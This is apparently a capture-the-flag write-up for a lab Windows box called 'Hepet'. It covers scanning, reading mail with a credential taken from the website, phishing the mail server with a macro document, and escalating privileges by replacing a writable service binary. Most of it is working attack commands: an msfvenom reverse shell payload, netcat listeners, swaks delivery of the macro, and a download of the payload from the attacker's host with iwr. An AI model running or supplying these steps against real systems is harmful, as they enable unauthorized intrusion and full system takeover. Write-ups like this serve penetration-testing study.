# Hepet

## Enumeration & scanning

- Find static website and mailserver.
- Mailserver is `mercury/32`, no vulnerable version.
- Bunch of other open ports such as FTP and Finger, but nothing of interest to be found.
- Mailserver blocks brute force by blocking requests, so some credential should be found.
- Find credential `jonas:SicMundusCreatusEst` on website, use it to read mailbox items.
- Read that mailserver processes Office files, meaning we could phish it with a macro.

``` sh
# Default scanning
sudo nmap -p- 192.168.153.140
sudo nmap -A -p 25,79,105,106,110,443,2224,5040,7680,11100,20001 192.168.153.140

# FTP
ftp -P 20001 192.168.153.140

# HTTP
nuclei -target https://192.168.153.140

# Finger
sudo nmap --script finger* -p 79 192.168.153.140

# Mail
sudo nmap -p 110 --script pop3* 192.168.153.140
sudo nmap -p 143 --script imap* 192.168.153.140   
nc 192.168.153.140 110
nc 192.168.153.140 143
# Read messages (POP3, same for IMAP)
nc 192.168.114.140 110
user jonas
pass SicMundusCreatusEst
list
retr 1
retr 2
retr ...
```

## Exploitation

- Create macro using Github project.
- Send mail using SMTP and `swaks`.
- Capture shell.

``` sh
# Create macro document (also try .ods if it doesn't work)
python3 mmg-odt.py windows 192.168.45.218 4444
# send mail (needed retries and reverts)
sudo swaks --to mailadmin@localhost --server 192.168.114.140 --from jonas@localhost --port 25 --body "please check" --header "Subject: please check" --attach @file.ods
nc -nvlp 4444
# get flag 
PS C:\users\Ela Arwel\Desktop> type local.txt
076e98519997f465cec2ebf21ecad98e
```

## Privilege Escalation

- Find service `VeyonService` with unquoted path and in user folder.
- Check binary permissions and find that we have full permission to modify it.
- Generate reverse shell binary and replace service binary with it.
- Service is set to `auto_start`, so need to reboot box to get shell.

``` sh
# check services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
# check binary permissions
icacls "C:\Users\Ela Arwel\Veyon\veyon-service.exe"
# EPET\Ela Arwel:(I)(F)
# Check service details
sc.exe qc VeyonService
# contains: ...AUTO_START...
# replace binary
ren veyon-service.exe old.service.exe
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.45.218 LPORT=4445 -f exe -o shell.exe
python3 -m http.server 80
iwr -uri http://192.168.45.218/shell.exe -Outfile veyon-service.exe
nc -nlvp 4445
# since service is 'auto_start', we need to reboot system
shutdown /r /t 0
# get flag
C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
2801fb902d73f28e6928ffe96928a15a
```

## References

- https://hackviser.com/tactics/pentesting/services/smtp
- https://github.com/0bfxgh0st/MMG-LO/tree/main

## Rabbit holes

- Credential on website was obvious but also random.
- Getting macro to work was inconsistent, reverting box helped.
